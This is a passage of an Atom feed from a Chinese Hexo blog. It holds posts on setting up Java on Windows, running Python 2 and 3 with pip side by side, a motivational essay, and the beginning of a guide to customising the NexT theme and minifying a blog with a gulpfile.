href="https://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">&#x6700;&#x65B0;&#x7248;Java&#x4E0B;&#x8F7D;&#x5730;&#x5740;</a><br><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">Java8_se &#x4E0B;&#x8F7D;&#x5730;&#x5740;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如何在Windows下安装配置Java环境变量配置&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="https://marnm.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Java" scheme="https://marnm.github.io/tags/Java/"/>
    
      <category term="编程" scheme="https://marnm.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Win10环境下Python2、3和pip2、3版本共存</title>
    <link href="https://marnm.github.io//posts/e9c6771b/"/>
    <id>https://marnm.github.io//posts/e9c6771b/</id>
    <published>2018-08-03T15:04:25.000Z</published>
    <updated>2020-04-09T12:57:53.399Z</updated>
    
    <content type="html"><![CDATA[<p>&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;Win10-x64&#x7684;&#x7535;&#x8111;&#x6765;&#x64CD;&#x4F5C;<br>&#x6211;&#x7684;Python&#x5B89;&#x88C5;&#x76EE;&#x5F55;<code>C:\Python\</code><br><a id="more"></a><br><strong>&#x5B89;&#x88C5;Python</strong><br>&#x9996;&#x5148;&#x5B89;&#x88C5;Python3<br><code>C:\Python\Python35\</code><br>&#x76F4;&#x63A5;&#x4E0B;&#x4E00;&#x6B65;&#x4E0B;&#x4E00;&#x6B65;&#x5373;&#x53EF;</p><p>&#x7136;&#x540E;&#x5B89;&#x88C5;Python2<br><code>C:\Python\Python27\</code><br>&#x5B89;&#x88C5;<code>Python2</code>&#x7684;&#x65F6;&#x5019;&#x628A;&#x6DFB;&#x52A0;&#x5230;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x52FE;&#x5148;&#x53BB;&#x6389;</p><p>&#x4FEE;&#x6539;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x7F16;&#x8F91;<code>Path</code>&#x53D8;&#x91CF;&#xFF0C;&#x6DFB;&#x52A0;<code>Python2</code>&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x8FD9;&#x91CC;&#x6211;&#x7684;&#x76EE;&#x5F55;&#x662F;<code>C:\Python\Python27\</code>&#x548C;<code>C:\Python\Python27\Scripts\</code></p><p>&#x5C06;<code>python.exe</code>&#x91CD;&#x547D;&#x540D;&#x4E86;<br>&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;<code>python3.exe</code>&#xFF1B;<br>&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;<code>python2.exe</code>&#x5373;&#x53EF;</p><p><strong>pip&#x7684;&#x8BBE;&#x7F6E;</strong><br> Python &#x5B89;&#x88C5;&#x5305;&#x9700;&#x8981;&#x7528;&#x5230;&#x5305;&#x7BA1;&#x7406;&#x5DE5;&#x5177;pip&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x540C;&#x65F6;&#x5B89;&#x88C5;python2&#x548C;python3&#x7684;&#x65F6;&#x5019;&#xFF0C;pip&#x53EA;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x4EE5;&#x4E0B;&#x5C06;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x65B9;&#x5F0F;&#xFF0C;&#x5373;&#x91CD;&#x65B0;&#x5B89;&#x88C5;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;pip&#xFF0C;&#x4F7F;&#x5F97;&#x4E24;&#x4E2A;python&#x7248;&#x672C;&#x7684;pip&#x80FD;&#x591F;&#x5171;&#x5B58;&#x3002;<br>&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;<br><strong><code>python3 -m pip install --upgrade pip --force-reinstall</code></strong></p><p><strong><code>python2 -m pip install --upgrade pip --force-reinstall</code></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里我使用Win10-x64的电脑来操作&lt;br&gt;我的Python安装目录&lt;code&gt;C:\Python\&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="https://marnm.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="编程" scheme="https://marnm.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python2" scheme="https://marnm.github.io/tags/Python2/"/>
    
      <category term="pip" scheme="https://marnm.github.io/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>自由的灵魂必将远航</title>
    <link href="https://marnm.github.io//posts/9e3f6743/"/>
    <id>https://marnm.github.io//posts/9e3f6743/</id>
    <published>2018-08-03T13:55:24.000Z</published>
    <updated>2022-05-27T01:35:29.643Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4F60;&#x80CC;&#x5355;&#x8BCD;&#x65F6;&#xFF0C;&#x963F;&#x62C9;&#x65AF;&#x52A0;&#x7684;&#x9CD5;&#x9C7C;&#x6B63;&#x8DC3;&#x51FA;&#x6C34;&#x9762;&#xFF1B;&#x4F60;&#x7B97;&#x6570;&#x5B66;&#x65F6;&#xFF0C;&#x592A;&#x5E73;&#x6D0B;&#x5F7C;&#x5CB8;&#x7684;&#x6D77;&#x9E25;&#x632F;&#x7FC5;&#x63A0;&#x8FC7;&#x57CE;&#x5E02;&#x4E0A;&#x7A7A;&#xFF1B;&#x4F60;&#x665A;&#x81EA;&#x4E60;&#x65F6;&#xFF0C;&#x6781;&#x5708;&#x4E0A;&#x7684;&#x591C;&#x7A7A;&#x6563;&#x6F2B;&#x4E86;&#x4E94;&#x5F69;&#x6591;&#x6593;&#xFF1B;&#x4F46;&#x662F;&#x5C11;&#x5E74;&#x4F60;&#x522B;&#x7740;&#x6025;&#xFF0C;&#x5728;&#x4F60;&#x4E3A;&#x81EA;&#x5DF1;&#x672A;&#x6765;&#x8E0F;&#x8E0F;&#x5B9E;&#x5B9E;&#x5730;&#x52AA;&#x529B;&#x65F6;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x611F;&#x89C9;&#x4ECE;&#x6765;&#x4E0D;&#x4F1A;&#x770B;&#x5230;&#x7684;&#x666F;&#x8272;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x89C9;&#x5F97;&#x7EC8;&#x8EAB;&#x4E0D;&#x4F1A;&#x9047;&#x5230;&#x7684;&#x4EBA;&#xFF0C;&#x6B63;&#x4E00;&#x6B65;&#x6B65;&#x5411;&#x4F60;&#x8D70;&#x6765;&#x3002;<br><a id="more"></a><br>&#x6211;&#x60F3;&#x8C61;&#x4E0D;&#x5230;&#x5728;&#x8FD9;&#x4E2A;&#x661F;&#x7403;&#x53D1;&#x751F;&#x7684;&#x5F88;&#x591A;&#x7F8E;&#x597D;&#x7684;&#x666F;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x624D;&#x52AA;&#x529B;&#xFF0C;&#x56E0;&#x4E3A;&#x4E16;&#x754C;&#x90A3;&#x4E48;&#x5927;&#xFF0C;&#x6211;&#x60F3;&#x53BB;&#x770B;&#x770B;&#x3002;</p><p>&#x4F9D;&#x7136;&#x8FD8;&#x662F;&#x5F88;&#x559C;&#x6B22;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;</p><p>&#x6211;&#x8FD8;&#x5728;&#x52AA;&#x529B;&#xFF0C;&#x6240;&#x4EE5;&#x7B49;&#x7B49;&#x6211;</p><p>&#x563B;&#x563B;&#xFF0C;&#x539F;&#x6765;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x4E0D;&#x7B97;&#x9E21;&#x6C64;&#x5440;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1ftxmperp0kj30k00b9q82.jpg" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p></p><p>&#x5B66;&#x5F1F;&#x5B66;&#x59B9;&#x4E5F;&#x52A0;&#x6CB9;&#xFF0C;&#x6211;&#x5728;&#x8DDD;&#x79BB;&#x6E05;&#x534E;5&#x516C;&#x91CC;&#x5916;&#x7684;</p><p>&#x5317;&#x56DB;&#x73AF;&#xFF0C;&#x7B49;&#x4F60;</p><p>&#x53EA;&#x662F;&#x4E2A;&#x6C89;&#x9ED8;&#x7684;&#x5927;&#x591A;&#x6570;</p><p>&#x591A;&#x8BF4;&#x4E86;&#x51E0;&#x53E5;&#x8BDD;&#x3002;</p><p>&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x597D;&#x50CF;&#x6211;&#x60F3;&#x5728;&#x7684;&#x751F;&#x6D3B;&#x72B6;&#x6001;</p><p>&#x5FEB;&#x8282;&#x594F;&#x7684;&#x751F;&#x6D3B;</p><p>&#x5F53;&#x4F60;&#x8BA4;&#x771F;&#x8D77;&#x6765;&#x7684;&#x6837;&#x5B50;&#x771F;&#x7684;&#x6709;&#x70B9;&#x53EF;&#x7231;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYly1ftxmrj5vi8j30k00jcqet.jpg" alt="doge | 300x300" title="">                </div>                <div class="image-caption">doge | 300x300</div>            </figure><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1ftxmsdymwzj30k00f0gzn.jpg" alt="books" title="">                </div>                <div class="image-caption">books</div>            </figure><br>to be or not to be.<br>that is the question.<br>&#x8C28;&#x4EE5;&#x6B64;&#x53E5;&#x732E;&#x7ED9;&#x5728;&#x8FF7;&#x96FE;&#x4E2D;&#x7825;&#x783A;&#x524D;&#x884C;&#x7684;&#x6211;&#x4EEC;<p></p><p>&#x540E;&#x7EED;&#x2026;<br>&#x8C22;&#x8C22;&#x5927;&#x5BB6;&#x7684;&#x8D5E;<br>&#x8FD9;&#x53E5;&#x8BDD;&#x4F1A;&#x6709;&#x79CD;&#x83AB;&#x540D;&#x7684;&#x60C5;&#x6000;&#xFF0C;&#x6709;&#x70B9;&#x5C0F;&#x6CBB;&#x6108;&#x3002;<br><strong>&#x5F53;&#x7136;&#xFF0C;&#x52AA;&#x529B;&#x4E0D;&#x662F;&#x81EA;&#x6211;&#x611F;&#x52A8;</strong><br><strong>&#x6700;&#x6015;&#x4F60;&#x4E00;&#x76F4;&#x5FD9;&#x5FD9;&#x788C;&#x788C;</strong><br><strong>&#x5230;&#x5934;&#x6765;&#x8FD8;&#x5728;&#x4EBA;&#x6D77;&#x91CC;&#x6D6E;&#x6C89;&#x3002;</strong><br><strong>&#x6709;&#x8DA3;&#x7684;&#x7075;&#x9B42;&#x548C;&#x52AA;&#x529B;&#x7684;&#x4F60;&#x90FD;&#x8981;&#x5728;&#x8DEF;&#x4E0A;</strong></p><hr><p>&#x6765;&#x81EA;<code>&#x77E5;&#x4E4E;</code><a href="https://www.zhihu.com/question/274001514/answer/405301907" target="_blank" rel="noopener">&#x5F53;&#x4EE3;&#x5927;&#x5B66;&#x751F;&#x6709;&#x591A;&#x52AA;&#x529B;&#xFF1F;</a><code>@&#x859B;&#x5B9A;&#x8C14;&#x7684; en</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;你背单词时，阿拉斯加的鳕鱼正跃出水面；你算数学时，太平洋彼岸的海鸥振翅掠过城市上空；你晚自习时，极圈上的夜空散漫了五彩斑斓；但是少年你别着急，在你为自己未来踏踏实实地努力时，那些你感觉从来不会看到的景色，那些你觉得终身不会遇到的人，正一步步向你走来。&lt;br&gt;
    
    </summary>
    
    
      <category term="学习" scheme="https://marnm.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="生活" scheme="https://marnm.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="努力" scheme="https://marnm.github.io/tags/%E5%8A%AA%E5%8A%9B/"/>
    
  </entry>
  
  <entry>
    <title>NexT主题优化+美化</title>
    <link href="https://marnm.github.io//posts/60444925/"/>
    <id>https://marnm.github.io//posts/60444925/</id>
    <published>2018-07-27T12:16:41.000Z</published>
    <updated>2022-05-26T13:32:07.811Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h3><p>&#x5173;&#x4E8E;Hexo&#x535A;&#x5BA2;NexT&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x5C31;&#x4E0D;&#x4E00;&#x4E00;&#x5217;&#x4E3E;&#x7684;&#xFF0C;&#x7F51;&#x4E0A;&#x6559;&#x7A0B;&#x4E00;&#x5927;&#x5806;&#xFF0C;&#x6211;&#x5C31;&#x5217;&#x51FA;&#x4E00;&#x4E9B;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#x7684;</p><h3 id="1-0-&#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;"><a href="#1-0-&#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;" class="headerlink" title="1.0 &#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;"></a>1.0 &#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316;</h3><a id="more"></a><h5 id="1-1-&#x66F4;&#x6539;&#x5B57;&#x4F53;"><a href="#1-1-&#x66F4;&#x6539;&#x5B57;&#x4F53;" class="headerlink" title="1.1 &#x66F4;&#x6539;&#x5B57;&#x4F53;"></a>1.1 &#x66F4;&#x6539;&#x5B57;&#x4F53;</h5><blockquote><p><code>themes\next\source\css\\_varibles\custom.styl</code></p></blockquote><figure class="highlight cs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x6807;&#x9898;&#xFF0C;&#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;</span></span><br><span class="line">$font-family-headings = Georgia, sans</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;</span></span><br><span class="line">$font-family-<span class="keyword">base</span> = <span class="string">&quot;Microsoft YaHei&quot;</span>, Verdana, sans-serif</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x4EE3;&#x7801;&#x5B57;&#x4F53;</span></span><br><span class="line">$code-font-family = <span class="string">&quot;Input Mono&quot;</span>, <span class="string">&quot;PT Mono&quot;</span>, Consolas, Monaco, Menlo, monospace</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x6B63;&#x6587;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">$font-size-<span class="keyword">base</span> = <span class="number">16</span>px</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x4EE3;&#x7801;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line">$code-font-size = <span class="number">13</span>px</span><br></pre></td></tr></tbody></table></figure><h5 id="1-2-&#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;"><a href="#1-2-&#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;" class="headerlink" title="1.2 &#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;"></a>1.2 &#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD;</h5><blockquote><p><code>themes\next\source\css\\_varibles\base.styl</code></p></blockquote><figure class="highlight cs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5168;&#x6587;&#x95F4;&#x8DDD;&#x53C2;&#x6570;</span></span><br><span class="line">$line-height-<span class="keyword">base</span>           = <span class="number">1.8</span></span><br><span class="line">$line-height-code-block     = <span class="number">1.6</span>  <span class="comment">// Can&apos;t be less than 1.3</span></span><br></pre></td></tr></tbody></table></figure><h5 id="1-3-&#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;"><a href="#1-3-&#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;" class="headerlink" title="1.3 &#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;"></a>1.3 &#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;</h5><p>&#x5B89;&#x88C5;gulp</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -g</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;gulp&#x4F9D;&#x8D56;&#x6A21;&#x5757;</p><blockquote><ul><li>gulp-htmlclean  //&#x6E05;&#x7406;HTML</li><li>gulp-htmlmin //&#x538B;&#x7F29;HTML</li><li>gulp-minify //&#x538B;&#x7F29;CSS</li><li>gulp-uglify //&#x6DF7;&#x6DC6;js</li><li>gulp-imagemin //&#x538B;&#x7F29;&#x56FE;&#x7247;</li></ul></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;&#x5B8C;&#x53EF;&#x4EE5;&#x5728;&#x6839;&#x76EE;&#x5F55;<code>package.json</code>&#x6587;&#x4EF6;&#x91CC;&#x770B;&#x5230;</p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;: {</span><br><span class="line">    &quot;gulp&quot;: &quot;^3.9.1&quot;,</span><br><span class="line">    &quot;gulp-imagemin&quot;: &quot;^4.1.0&quot;,</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">  },</span><br><span class="line">  &quot;devDependencies&quot;: {</span><br><span class="line">    &quot;babel-core&quot;: &quot;^6.26.3&quot;,</span><br><span class="line">    &quot;gulp-babel&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;gulp-htmlclean&quot;: &quot;^2.7.22&quot;,</span><br><span class="line">    &quot;gulp-htmlmin&quot;: &quot;^4.0.0&quot;,</span><br><span class="line">    &quot;gulp-minify-css&quot;: &quot;^1.2.4&quot;,</span><br><span class="line">    &quot;gulp-uglify&quot;: &quot;^3.0.1&quot;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x535A;&#x5BA2;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x624B;&#x52A8;&#x6DFB;&#x52A0;<code>gulpfile.js</code>&#x6587;&#x4EF6;</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&apos;gulp&apos;</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">&apos;gulp-minify-css&apos;</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">&apos;gulp-uglify&apos;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">&apos;gulp-htmlmin&apos;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">&apos;gulp-htmlclean&apos;</span>);</span><br><span class="line"><span class="keyword">var</span> imagemin = <span class="built_in">require</span>(<span class="string">&apos;gulp-imagemin&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x538B;&#x7F29;html</span></span><br><span class="line">gulp.task(<span class="string">&apos;minify-html&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&apos;./public/**/*.html&apos;</span>)</span><br><span class="line">        .pipe(htmlclean())</span><br><span class="line">        .pipe(htmlmin({</span><br><span class="line">            removeComments: <span class="literal">true</span>,</span><br><span class="line">            minifyJS: <span class="literal">true</span>,</span><br><span class="line">            minifyCSS: <span class="literal">true</span>,</span><br><span class="line">            minifyURLs: <span class="literal">true</span>,</span><br><span class="line">        }))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&apos;./public&apos;</span>))</span><br><span class="line">});</span><br><span class="line"><span class="comment">// &#x538B;&#x7F29;css</span></span><br><span class="line">gulp.task(<span class="string">&apos;minify-css&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&apos;./public/**/*.css&apos;</span>)</span><br><span class="line">        .pipe(minifycss({</span><br><span class="line">            compatibility: <span class="string">&apos;ie8&apos;</span></span><br><span class="line">        }))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&apos;./public&apos;</span>));</span><br><span class="line">});</span><br><span class="line"><span class="comment">// &#x538B;&#x7F29;js</span></span><br><span class="line">gulp.task(<span class="string">&apos;minify-js&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&apos;./public/js/**/*.js&apos;</span>)</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&apos;./public&apos;</span>));</span><br><span class="line">});</span><br><span class="line"><span class="comment">// &#x538B;&#x7F29;&#x56FE;&#x7247;</span></span><br><span class="line">gulp.task(<span class="string">&apos;minify-images&apos;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&apos;./public/images/**/*.*&apos;</span>)</span><br><span class="line">        .pipe(imagemin(</span><br><span class="line">        [imagemin.gifsicle({<span class="string">&apos;optimizationLevel&apos;</span>: <span class="number">3</span>}), </span><br><span class="line">        imagemin.jpegtran({<span class="string">&apos;progressive&apos;</span>: <span class="literal">true</span>}), </span><br><span class="line">        imagemin.optipng({<span class="string">&apos;optimizationLevel&apos;</span>: <span class="number">7</span>}), </span><br><span class="line">        imagemin.svgo()],</span><br><span class="line">        {<span class="string">&apos;verbose&apos;</span>: <span class="literal">true</span>}))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&apos;./public/images&apos;</span>))</span><br><span class="line">});</span><br><span class="line"><span class="comment">// &#x9ED8;&#x8BA4;&#x4EFB;&#x52A1;</span></span><br><span class="line">gulp.task(<span class="string">&apos;default&apos;</span>, [</span><br><span class="line">    <span class="string">&apos;minify-html&apos;</span>,<span class="string">&apos;minify-css&apos;</span>,<span class="string">&apos;minify-js&apos;</span>,<span class="string">&apos;minify-images&apos;</span></span><br><span class="line">]);</span><br></pre></td></tr></tbody></table></figure><p>&#x76F4;&#x63A5;&#x8FD0;&#x884C;<code>gulp</code>&#x547D;&#x4EE4;&#x5F00;&#x59CB;&#x538B;&#x7F29;</p><p><strong>&#x53C2;&#x8003;&#x94FE;&#x63A5;</strong></p><p><a href="http://fengdi.org/2017/08/07/Hexo%E5%8D%9A%E5%AE%A2%E4%B9%8B%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96.html" target="_blank" rel="noopener">Hexo&#x535A;&#x5BA2;&#x4E4B;&#x901F;&#x5EA6;&#x4F18;&#x5316;</a></p><p><a href="https://www.karlzhou.com/articles/compress-minify-hexo/" target="_blank" rel="noopener">&#x4F18;&#x5316;Hexo&#x535A;&#x5BA2; - &#x538B;&#x7F29; HTML&#x3001;CSS&#x3001;JS&#x3001;IMG &#x7B49;</a></p><p><a href="https://www.liuxinggang.com/2016-12-06-hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%8D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">hexo&#x535A;&#x5BA2;&#x8FDB;&#x9636; - &#x6027;&#x80FD;&#x4F18;&#x5316;</a> </p><h3 id="2-0-&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;"><a href="#2-0-&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;" class="headerlink" title="2.0 &#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;"></a>2.0 &#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;</h3><h5 id="2-1-&#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;"><a href="#2-1-&#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;" class="headerlink" title="2.1 &#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;"></a>2.1 &#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;</h5><h5 id="2-2-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;"><a href="#2-2-&#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;" class="headerlink" title="2.2 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;"></a>2.2 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;</h5><blockquote><p><code>theme\next\source\css\\_common\components\post\post.styl</code></p></blockquote><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// &#x5728;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;</span><br><span class="line">// 